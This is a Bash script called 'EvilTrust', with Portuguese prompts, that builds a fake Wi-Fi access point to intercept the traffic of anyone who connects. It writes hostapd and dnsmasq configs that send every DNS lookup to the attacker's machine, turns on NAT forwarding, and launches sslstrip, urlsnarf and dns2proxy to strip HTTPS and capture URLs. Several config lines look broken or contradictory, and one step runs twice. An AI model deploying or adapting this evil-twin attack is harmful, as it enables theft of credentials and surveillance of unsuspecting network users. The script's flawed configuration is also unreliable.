#!/bin/bash
# Script por Jeanpseven (wrench)
# GitHub: jeanpseven

function banner(){
    echo "EvilTrust - Fake Access Point Script"
    echo "------------------------------------"
}

function dependencies(){
    apt-get -y install xterm
}

function getCredentials(){
    read -p "Digite o nome da rede (SSID): " ssid
    read -p "Digite a senha (deixe em branco para sem senha): " password
}

function startAttack(){
    choosed_interface=$(ifconfig | grep wlan | cut -d ' ' -f 1)
    use_channel=$(iwlist $choosed_interface channel | grep "Current Frequency" | cut -d '(' -f 2 | cut -d ')' -f 1)
    echo -e "interface=$choosed_interface\n" > hostapd.conf
    echo -e "driver=nl80211\n" >> hostapd.conf
    echo -e "ssid=$ssid\n" >> hostapd.conf
    if [ -n "$password" ]; then
        echo -e "wpa_passphrase=$password\n" >> hostapd.conf
    else
        echo -e "open\n" >> hostapd.conf
    fi
    echo -e "channel=$use_channel\n" >> hostapd.conf
    echo -e "macaddr_acl=0\n" >> hostapd.conf
    echo -e "auth_algs=1\n" >> hostapd.conf
    echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf
    echo -e "wpa=3\n" >> hostapd.conf
    echo -e "wpa_key_mgmt=WPA-PSK\n" >> hostapd.conf
    echo -e "wpa_pairwise=TKIP\n" >> hostapd.conf
    echo -e "rsn_pairwise=CCMP\n" >> hostapd.conf
    echo -e "interface=$choosed_interface\n" > dnsmasq.conf
    echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
    echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
    echo -e "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
    echo -e "server=8.8.8.8\n" >> dnsmasq.conf
    echo -e "log-queries\n" >> dnsmasq.conf
    echo -e "log-dhcp\n" >> dnsmasq.conf
    echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
    echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf
    echo -e "mv /etc/dnsmasq.conf /etc/dnsmasq.conf.bak\n" > dnsmasq.sh
    echo -e "mv /etc/hostapd/hostapd.conf /etc/hostapd/hostapd.conf.bak\n" > hostapd.sh
    echo -e "cp dnsmasq.conf /etc/\n" >> dnsmasq.sh
    echo -e "cp hostapd.conf /etc/hostapd/\n" >> hostapd.sh
    echo -e "ifconfig $choosed_interface 192.168.1.1\n" >> hostapd.sh
    echo -e "service dnsmasq restart\n" >> hostapd.sh
    echo -e "service hostapd restart\n" >> hostapd.sh
    echo -e "iptables --table nat -A POSTROUTING -o eth0 -j MASQUERADE\n" >> hostapd.sh
    echo -e "echo 1 > /proc/sys/net/ipv4/ip_forward\n" >> hostapd.sh
    echo -e "bash utilities/banner.sh\n" >> hostapd.sh
    echo -e "bash utilities/firewall.sh\n" >> hostapd.sh
    echo -e "sleep 3; clear\n" >> hostapd.sh
    chmod +x dnsmasq.sh hostapd.sh
    xterm -e ./dnsmasq.sh
    xterm -e ./hostapd.sh
    xterm -e bash utilities/sslstrip.sh
    xterm -e bash utilities/urlsnarf.sh
    xterm -e bash utilities/dns2proxy.sh
    xterm -e bash utilities/sslstrip.sh
    sleep 2; bash utilities/banner.sh
    xterm -e bash utilities/datos.sh
}

function main(){
    clear
    banner
    dependencies
    getCredentials
    startAttack
}

main